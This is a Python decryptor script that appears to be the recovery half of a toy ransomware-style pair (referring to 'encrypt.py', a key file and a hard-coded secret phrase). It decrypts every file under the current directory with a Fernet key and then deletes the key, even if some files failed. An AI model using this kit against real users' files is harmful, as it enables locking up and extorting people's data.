import os
from cryptography.fernet import Fernet

# Constantes
BASE_DIR = '.'
KEY_FILE = 'thekey.key'
SECRET_PHRASE = 'bernardo'

def get_files_to_decrypt(base_dir):
    files = []
    for dirpath, _, filenames in os.walk(base_dir):
        for filename in filenames:
            if filename not in ['encrypt.py', KEY_FILE, 'decrypt.py']:
                files.append(os.path.join(dirpath, filename))
    return files

def decrypt_files(files, key):
    for file in files:
        with open(file, "rb") as curr_file:
            data = curr_file.read()
        try:
            decrypted_data = Fernet(key).decrypt(data)
            with open(file, "wb") as curr_file:
                curr_file.write(decrypted_data)
        except Exception as e:
            print(f"Failed to decrypt {file}: {e}")

def main():
    if not os.path.exists(KEY_FILE):
        print(f"Key file '{KEY_FILE}' not found.")
        return

    with open(KEY_FILE, "rb") as key_file:
        key = key_file.read()

    # user_phrase = input("Enter the secret phrase: ")
    # if user_phrase != SECRET_PHRASE:
    #     print("Incorrect secret phrase.")
    #     return

    files_to_decrypt = get_files_to_decrypt(BASE_DIR)

    decrypt_files(files_to_decrypt, key)

    os.remove(KEY_FILE)

if __name__ == "__main__":
    main()
